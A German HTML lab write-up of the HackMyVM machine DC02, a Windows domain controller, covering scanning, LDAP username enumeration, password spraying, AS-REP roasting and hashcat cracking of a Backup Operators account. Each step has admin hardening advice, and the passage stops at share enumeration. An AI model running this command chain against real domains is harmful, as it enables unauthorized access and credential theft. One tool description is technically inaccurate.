@@ -1,0 +1,906 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DC02 - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>DC02 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nxc (NetExec)</div>
+                <div class="tool-item">ldapnomnom</div>
+                <div class="tool-item">GetUserSPNs.py</div>
+                <div class="tool-item">GetNPUsers.py</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">ldapdomaindump</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ll (ls -l)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">locate</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">smbserver.py</div>
+                <div class="tool-item">reg.py</div>
+                <div class="tool-item">secretsdump.py</div>
+                <div class="tool-item">wmiexec.py</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.117	08:00:27:76:8b:23	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>arp-scan -l</code> wird verwendet, um aktive Hosts im lokalen Netzwerksegment mittels ARP-Anfragen zu entdecken. Die Ausgabe identifiziert einen Host mit der IP-Adresse <code>192.168.2.117</code> und der MAC-Adresse <code>08:00:27:76:8b:23</code>, welche Oracle (VirtualBox) zugeordnet ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der erste Schritt zur Identifizierung des Ziels im Netzwerk. Die IP <code>192.168.2.117</code> ist unser Ziel für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP-Adresse als Ziel für nachfolgende Scans (z.B. Nmap Portscan) verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring kann helfen, solche Scans zu erkennen. Segmentierung kann die Reichweite begrenzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	CCat
+
+
+        #       192.168.2.104   animetronic.hmv
+        #       192.168.2.105   king.vln
+        #       192.168.2.106   airbinds.hmv
+        #       192.168.2.107   za.hmv za1.hmv
+        #       192.168.2.108   library.vln
+        #       192.168.2.109	lampiano.vln
+        #       192.168.2.110   infosecwarrior.vln
+        #       192.168.2.111   wave.hmv
+        #       192.168.2.112   easy.vln skymbu.info
+        #       192.168.2.113   metamorphose.hmv
+        #       192.168.2.114   dc01.hmv
+        #       192.168.2.115   gemini.vln
+        #       192.168.2.116	dobby.vln
+                <span class="command">192.168.2.117   dc02.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei <code>/etc/hosts</code> auf dem Angreifer-System wird bearbeitet (vermutlich mit `vi`). Ein Eintrag wird hinzugefügt, um die IP-Adresse <code>192.168.2.117</code> dem Hostnamen <code>dc02.hmv</code> zuzuordnen. Dies erleichtert die Verwendung des Hostnamens anstelle der IP-Adresse in nachfolgenden Befehlen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine gängige Praxis, um die Lesbarkeit und Handhabung von Befehlen zu verbessern, besonders wenn Dienste wie Kerberos oder LDAP involviert sind, die oft Hostnamen erwarten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konsequent den definierten Hostnamen (<code>dc02.hmv</code>) verwenden, wo immer möglich.<br><strong>Empfehlung (Admin):</strong> Dies ist eine lokale Konfiguration auf dem Angreifer-System und hat keine direkten Auswirkungen auf das Ziel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.117 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 23:22 CEST
+Nmap scan report for dc02.hmv (192.168.2.117)
+Host is up (0.00017s latency).
+Not shown: 65518 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+<span class="command">53/tcp    open  domain        Simple DNS Plus</span>
+<span class="command">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-10 06:23:24Z)</span>
+<span class="command">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="command">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="command">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SUPEDECDE.LCAL, Site: Default-First-Site-Name)</span>
+<span class="command">445/tcp   open  microsoft-ds?</span>
+<span class="command">464/tcp   open  kpasswd5?</span>
+<span class="command">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">636/tcp   open  tcpwrapped</span> <!-- (LDAPS) -->
+<span class="command">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SUPEDECDE.LCAL, Site: Default-First-Site-Name)</span> <!-- (Global Catalog) -->
+<span class="command">3269/tcp  open  tcpwrapped</span> <!-- (Global Catalog LDAPS) -->
+<span class="command">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span> <!-- (WinRM) -->
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+<span class="command">9389/tcp  open  mc-nmf        .NET Message Framing</span>
+<span class="command">49664/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">49721/tcp open  msrpc         Microsoft Windows RPC</span>
+MAC Address: 08:00:27:76:8B:23 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (90%), Microsoft Windows Server 2016 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: <span class="password">DC01</span>; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 8h59m58s
+| smb2-time:
+|   date: 2024-08-10T06:24:17
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    <span class="password">Message signing enabled and required</span>
+|_nbstat: NetBIOS name: <span class="password">DC01</span>, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:76:8b:23 (Oracle VirtualBox virtual NIC)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms dc02.hmv (192.168.2.117)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf dem Ziel <code>192.168.2.117</code> durchgeführt.
+                <ul>
+                    <li><code>-sC</code>: Standard-Skripte.</li>
+                    <li><code>-sS</code>: SYN-Scan.</li>
+                    <li><code>-sV</code>: Versionserkennung.</li>
+                    <li><code>-A</code>: Aggressiver Scan (OS-Erkennung, Version, Skripte, Traceroute).</li>
+                    <li><code>-T5</code>: Sehr schnelles Timing.</li>
+                    <li><code>-p-</code>: Alle TCP-Ports.</li>
+                </ul>
+                Die Ergebnisse zeigen eine typische Konfiguration eines Windows Active Directory Domain Controllers (DC). Viele Ports sind offen, darunter DNS (53), Kerberos (88), LDAP (389, 3268), LDAPS (636, 3269), SMB (139, 445), RPC (135, 593, dynamische Ports) und WinRM (5985). Der Domainname wird als <code>SUPEDECDE.LCAL</code> identifiziert. Interessanterweise melden NetBIOS (`nbstat`) und Service Info den Hostnamen als <code>DC01</code>, obwohl wir <code>dc02.hmv</code> scannen. SMB-Message-Signing ist aktiviert und erforderlich (`smb2-security-mode`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan bestätigt, dass es sich um einen Windows Domain Controller handelt. Die offenen Ports bieten zahlreiche Angriffsmöglichkeiten im AD-Kontext (LDAP-Enumeration, Kerberos-Angriffe, SMB-Enumeration/Angriffe). Die Diskrepanz im Hostnamen (DC01 vs. DC02) ist ein wichtiger Hinweis, der möglicherweise auf Konfigurationsprobleme oder eine Umbenennung hindeutet. Die SMB-Signierungspflicht schränkt einige Angriffe (z.B. unauthentifizierte Relay-Angriffe) ein, aber nicht alle.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der Enumeration von Active Directory beginnen: Benutzer, Gruppen, Richtlinien über LDAP (Port 389) abfragen. Nach bekannten AD-Schwachstellen suchen (z.B. AS-REP Roasting, Kerberoasting). SMB auf mögliche Shares prüfen (authentifiziert und anonym). Den Hostnamen-Konflikt im Hinterkopf behalten.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Ports von außen erreichbar sind (dies scheint ein internes Netz zu sein, daher sind viele Ports offen). SMB-Signierung ist eine gute Sicherheitsmaßnahme. Den Hostnamen-Konflikt untersuchen und korrigieren. Clock Skew überprüfen und ggf. NTP korrekt konfigurieren. Betriebssystem und Dienste aktuell halten.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.117 -p- | grep open</span></div>
+                    <pre>
+<span class="command">53/tcp    open  domain?</span>
+<span class="command">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-10 06:23:40Z)</span>
+<span class="command">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="command">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="command">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SUPEDECDE.LCAL, Site: Default-First-Site-Name)</span>
+<span class="command">445/tcp   open  microsoft-ds?</span>
+<span class="command">464/tcp   open  kpasswd5?</span>
+<span class="command">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">636/tcp   open  tcpwrapped</span>
+<span class="command">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SUPEDECDE.LCAL, Site: Default-First-Site-Name)</span>
+<span class="command">3269/tcp  open  tcpwrapped</span>
+<span class="command">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="command">9389/tcp  open  mc-nmf        .NET Message Framing</span>
+<span class="command">49664/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">49721/tcp open  msrpc         Microsoft Windows RPC</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl wiederholt den vorherigen Nmap-Scan, leitet die Ausgabe jedoch durch <code>grep open</code>, um nur die Zeilen anzuzeigen, die offene Ports enthalten. Dies bietet eine kompaktere Übersicht über die Angriffsfläche.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine nützliche Methode, um die relevanten Ergebnisse eines langen Nmap-Scans schnell zu extrahieren. Bestätigt die zuvor identifizierten offenen Ports.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese gefilterte Liste als Referenz für die nächsten Enumerationsschritte verwenden.<br><strong>Empfehlung (Admin):</strong> Keine zusätzlichen Maßnahmen erforderlich, dient der Übersicht.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.117  -u "" -p "" --shares</span></div>
+                    <pre>
+SMB         192.168.2.117   445    DC01             [] <span class="command">Windows Server 2022 Build 20348 x64</span> (name:DC01) (domain:<span class="command">SUPEDECDE.LCAL</span>) (signing:True) (SMBv1:False)
+SMB         192.168.2.117   445    DC01             [-] <span class="password">SUPEDECDE.LCAL\: STATUS_ACCESS_DENIED</span>
+SMB         192.168.2.117   445    DC01             [-] <span class="password">Error getting user: list index out of range</span>
+SMB         192.168.2.117   445    DC01             [-] <span class="password">Error enumerating shares: Error occurs while reading from remote(104)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `nxc` (NetExec) über SMB eine anonyme Verbindung (<code>-u "" -p ""</code>) zum Ziel herzustellen und die verfügbaren Shares aufzulisten (<code>--shares</code>). Der Befehl bestätigt erneut die OS-Version, den Hostnamen DC01 und die Domain SUPEDECDE.LCAL. Der Versuch, als anonymer Benutzer Shares aufzulisten, scheitert jedoch mit <code>STATUS_ACCESS_DENIED</code> und nachfolgenden Fehlern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Scheitern der anonymen Enumeration ist erwartet und eine gängige Sicherheitskonfiguration. Es bestätigt, dass für weitere SMB-Interaktionen gültige Anmeldedaten benötigt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, gültige Benutzerkonten zu finden (z.B. über LDAP-Enumeration) und anschließend Passwort-Angriffe (Spray, Brute-Force) oder andere Authentifizierungsmethoden (Kerberos-Angriffe) durchzuführen.<br><strong>Empfehlung (Admin):</strong> Anonymen Zugriff auf SMB-Shares deaktivieren (ist hier bereits der Fall).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/go/bin]
+└─# <span class="command">ldapnomnom  -input /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -server dc02.hmv | tee users.txt</span></div>
+                    <pre>
+ __    ____  _____ _____
+|  |  |    \|  _  |  _  |___ ___ _____ ___ ___ _____
+|  |__|  |  |     |   __|   | . |     |   | . |     |
+|_____|____/|__|__|__|  |_|_|___|_|_|_|_|_|___|_|_|_|
+
+IN  SPACE  N  NE  CAN  HEAR  YU  NM  NM  USERNAMES
+
+<span class="command">admin</span>
+<span class="command">charlie</span>
+<span class="command">Charlie</span>
+<span class="command">administrator</span>
+<span class="command">Admin</span>
+<span class="command">Administrator</span>
+<span class="command">CHARLIE</span>
+<span class="command">ADMIN</span>
+<span class="command">wreed11</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `ldapnomnom` wird verwendet, um Benutzernamen im Active Directory über LDAP zu enumerieren. Es nutzt eine Technik, bei der versucht wird, Kerberos Pre-Authentication-Daten für eine Liste potenzieller Benutzernamen (aus <code>xato-net-10-million-usernames.txt</code>) vom Domain Controller (<code>dc02.hmv</code>) anzufordern. Wenn der DC für einen Namen eine spezifische Antwort gibt (anstatt "User not found"), wird der Name als wahrscheinlich gültig betrachtet. Die Ausgabe (und die Datei <code>users.txt</code> durch <code>tee</code>) zeigt eine Liste von Benutzernamen, die im AD `SUPEDECDE.LCAL` existieren könnten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger Schritt zur Identifizierung potenzieller Ziele für Passwortangriffe. Mehrere Benutzernamen wurden gefunden, darunter generische Namen wie `admin`, `administrator` und spezifischere wie `charlie` und `wreed11`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene Liste <code>users.txt</code> als Input für Passwort-Spraying oder gezielte Brute-Force-Angriffe verwenden.<br><strong>Empfehlung (Admin):</strong> Anonyme LDAP-Abfragen einschränken, falls möglich. Intrusion Detection Systeme können auf ungewöhnlich viele Kerberos Pre-Auth-Anfragen von einer einzelnen Quelle achten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/go/bin]
+└─# <span class="command">nxc smb 192.168.2.117 -u users.txt -p users.txt --no-brute | grep -v -i Fail</span></div>
+                    <pre>
+SMB                      192.168.2.117   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+SMB                      192.168.2.117   445    DC01             [-] SUPEDECDE.LCAL\: STATUS_ACCESS_DENIED
+SMB                      192.168.2.117   445    DC01             [-] SUPEDECDE.LCAL\: STATUS_ACCESS_DENIED
+SMB                      192.168.2.117   445    DC01             <span class="password">[+] SUPEDECDE.LCAL\charlie:charlie</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird ein Passwort-Spraying-Angriff mit `nxc` durchgeführt. Für jeden Benutzernamen in <code>users.txt</code> (<code>-u users.txt</code>) wird versucht, sich mit demselben Benutzernamen als Passwort (<code>-p users.txt</code>) über SMB anzumelden. Die Option <code>--no-brute</code> stellt sicher, dass nur ein Versuch pro Benutzer erfolgt (Username=Password). Die Ausgabe wird durch <code>grep -v -i Fail</code> gefiltert, um nur erfolgreiche Logins anzuzeigen. Das Ergebnis zeigt einen erfolgreichen Login für den Benutzer `charlie` mit dem Passwort `charlie`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Ein gültiges Paar aus Benutzername und Passwort (`charlie:charlie`) wurde gefunden. Dies stellt den initialen Zugriff auf das System dar. Das Passwort ist sehr schwach.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Anmeldedaten (`SUPEDECDE.LCAL\charlie:charlie`) verwenden, um weitere Enumerationen durchzuführen (z.B. Shares auflisten, LDAP abfragen, Kerberos-Tickets anfordern).<br><strong>Empfehlung (Admin):</strong> Starke Passwortrichtlinien durchsetzen (Komplexität, Länge, keine Benutzernamen als Passwörter). Regelmäßige Passwort-Audits durchführen. Kontosperrungsrichtlinien implementieren, um Brute-Force/Spraying zu erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 GetUserSPNs.py SUPEDECDE.LCAL/charlie:charlie -dc-ip 192.168.2.117 -outputfile kerb.hashcat</span></div>
+                    <pre>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="password">No entries found!</span>
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 GetUserSPNs.py SUPEDECDE.LCAL/charlie:charlie -dc-ip dc02.hmv -outputfile kerb.hashcat</span></div>
+                    <pre>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="password">No entries found!</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mittels `GetUserSPNs.py` von Impacket einen Kerberoasting-Angriff durchzuführen. Mit den Anmeldedaten von `charlie` wird versucht, TGS-Tickets für Benutzerkonten anzufordern, die Service Principal Names (SPNs) konfiguriert haben. Die Hashes dieser Tickets könnten offline geknackt werden. Beide Versuche (mit IP und Hostname) scheitern jedoch mit der Meldung "No entries found!".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Entweder hat der Benutzer `charlie` nicht die notwendigen Rechte, um diese Informationen abzufragen, oder es gibt keine Benutzerkonten (außer Computerkonten) mit konfigurierten SPNs in dieser Domain, die für Kerberoasting anfällig wären.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Angriffsvektoren verfolgen, z.B. AS-REP Roasting oder weitere LDAP/SMB-Enumeration mit den `charlie`-Credentials.<br><strong>Empfehlung (Admin):</strong> Prinzip der geringsten Rechte anwenden. SPNs nur für Service-Konten setzen, die sie benötigen, und starke Passwörter für diese Konten verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 GetNPUsers.py SUPEDECDE.LCAL/charlie:charlie -dc-ip 192.168.2.117 -outputfile asrep.hashcat</span></div>
+                    <pre>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Name        MemberOf                                                PasswordLastSet             LastLogon                   UAC
+----------  ------------------------------------------------------  --------------------------  --------------------------  --------
+<span class="command">zximena448</span>  <span class="command">CN=Backup Operators,CN=Builtin,DC=SUPEDECDE,DC=LCAL</span>  2024-06-17 20:09:53.417046  2024-07-06 01:51:16.071116  <span class="command">0x410200</span>
+
+<span class="password">$krb5asrep$23$zximena448@SUPEDECDE.LCAL:870e37d09b978c1600f0e403f58cb2a7$dad7bb6e5ab538bed4acf06331d4569b0f88f416fa418efc2f60f872f2302b355fd45d9f47b68c5d820950ffabd4b6a8795293bee4131d60a3d0ae302597124f40db454355f31f3ee47c5fc66c7efc7e5b97c99fd9ab06dea930c9f70a909fb2d31a73f1676eec077d46504145c53e48a3e90a02fd6884eba21531c6ce05fa2f8109f9fc4b5380e6931ba19a610928e5b7858dd46defe0511a5271c9c721b2cacb187e838d70c56b24de3cf9190caa7c172f6faab9cb8b394fb9aadd16af3644cc2892db67467d2ae75f41a25a22cca44b23732ac172de35d042ad511dda40d5fe5aca1660a41173bc4086e8513c34df194e5aa723e3</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nun wird `GetNPUsers.py` verwendet, um einen AS-REP Roasting Angriff zu versuchen. Mit den `charlie`-Credentials wird nach Benutzern gesucht, bei denen die Kerberos Pre-Authentication deaktiviert ist (UAC-Flag `DONT_REQ_PREAUTH`). Für solche Benutzer kann ein Angreifer einen AS-REP-Hash anfordern, der offline geknackt werden kann. Der Befehl findet den Benutzer `zximena448` (Mitglied der Gruppe `Backup Operators`) und gibt erfolgreich dessen AS-REP-Hash (Format `$krb5asrep$23$...`) aus. Der UAC-Wert `0x410200` enthält das Flag `DONT_REQ_PREAUTH`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Ein Hash wurde für den Benutzer `zximena448` erhalten. Da dieser Benutzer Mitglied der `Backup Operators` ist, könnte ein erfolgreiches Knacken des Passworts signifikante Berechtigungen im System gewähren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den erhaltenen Hash in die Datei <code>asrep.hashcat</code> speichern (wurde durch <code>-outputfile</code> erledigt) und versuchen, ihn mit einem Tool wie Hashcat und einer Wortliste zu knacken.<br><strong>Empfehlung (Admin):</strong> Die Einstellung "Do not require Kerberos preauthentication" sollte nur in absoluten Ausnahmefällen aktiviert werden. Regelmäßig AD-Konten auf dieses Flag überprüfen und es deaktivieren, wo immer möglich. Die Mitgliedschaft in privilegierten Gruppen wie `Backup Operators` genau überwachen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hashcat -m 18200 asrep.hashcat /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+hashcat (v6.2.6) starting
+[...]
+Dictionary cache built:
+ Filename..: /usr/share/wordlists/rockyou.txt
+ Passwords.: 14344474
+ Bytes.....: 139922945
+ Keyspace..: 14344467
+ Runtime...: 0 secs
+
+<span class="password">$krb5asrep$23$zximena448@SUPEDECDE.LCAL:870e37d09b978c1600f0e403f58cb2a7$...:internet</span>
+
+<span class="password">Ergebnis = zximena448:internet</span>
+
+Session..........: hashcat
+Status...........: <span class="password">Cracked</span>
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$zximena448@SUPEDECDE.LCAL:870e37d0...a723e3
+Time.Started.....: Fri Aug  9 23:46:35 2024 (0 secs)
+Time.Estimated...: Fri Aug  9 23:46:35 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   360.4 kH/s (1.83ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: <span class="password">1/1 (100.00%)</span> Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 16384/14344467 (0.11%)
+Rejected.........: 0/16384 (0.00%)
+Restore.Point....: 0/14344467 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: R3v_m4lwh3r3_k1nG!! -> seven77
+Hardware.Mon.#1..: Util:  6%
+
+Started: Fri Aug  9 23:46:16 2024
+Stopped: Fri Aug  9 23:46:36 2024
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hashcat wird verwendet, um den in <code>asrep.hashcat</code> gespeicherten AS-REP-Hash zu knacken.
+                <ul>
+                    <li><code>-m 18200</code>: Spezifiziert den Hash-Typ als Kerberos 5 AS-REP (etype 23).</li>
+                    <li><code>asrep.hashcat</code>: Die Datei mit dem Hash.</li>
+                    <li><code>/usr/share/wordlists/rockyou.txt</code>: Die verwendete Passwortliste.</li>
+                </ul>
+                Hashcat findet sehr schnell das passende Passwort: `internet`.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Großartig! Das Passwort für den Benutzer `zximena448` wurde erfolgreich geknackt. Da dieser Benutzer Mitglied der `Backup Operators` ist, haben wir nun wahrscheinlich erhebliche Privilegien im System erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die neuen Anmeldedaten (`SUPEDECDE.LCAL\zximena448:internet`) verwenden, um sich anzumelden und die erweiterten Rechte auszunutzen. Insbesondere prüfen, ob Lesezugriff auf sensitive Bereiche wie das C$-Laufwerk oder die Möglichkeit zum Auslesen von Registry Hives besteht.<br><strong>Empfehlung (Admin):</strong> Erneut: Starke Passwortrichtlinien durchsetzen und die Verwendung von `DONT_REQ_PREAUTH` vermeiden. Die Rechte der `Backup Operators`-Gruppe überprüfen und einschränken, falls möglich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.117 -u zximena448 -p internet</span></div>
+                    <pre>
+SMB         192.168.2.117   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+SMB         192.168.2.117   445    DC01             <span class="password">[+] SUPEDECDE.LCAL\zximena448:internet</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die frisch geknackten Anmeldedaten für `zximena448` werden mit `nxc` getestet. Der Login ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Korrektheit des geknackten Passworts und die Gültigkeit des Accounts.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit diesen Credentials nun weitere Aktionen durchführen, z.B. Shares auflisten.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.117 -u zximena448 -p internet  --shares</span></div>
+                    <pre>
+SMB         192.168.2.117   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+SMB         192.168.2.117   445    DC01             [+] SUPEDECDE.LCAL\zximena448:internet
+SMB         192.168.2.117   445    DC01             [] Enumerated shares
+SMB         192.168.2.117   445    DC01             Share           Permissions     Remark
+SMB         192.168.2.117   445    DC01             -----           -----------     ------
+SMB         192.168.2.117   445    DC01             <span class="command">ADMIN$</span>          <span class="command">READ</span>            Remote Admin
+SMB         192.168.2.117   445    DC01             <span class="command">C$</span>              <span class="command">READ,WRITE</span>      Default share
+SMB         192.168.2.117   445    DC01             <span class="command">IPC$</span>            <span class="command">READ</span>            Remote IPC
+SMB         192.168.2.117   445    DC01             <span class="command">NETLOGON</span>        <span class="command">READ</span>            Logon server share
+SMB         192.168.2.117   445    DC01             <span class="command">SYSVOL</span>          <span class="command">READ</span>            Logon server share
+                    </pre>
+                 </div>
+            </div>
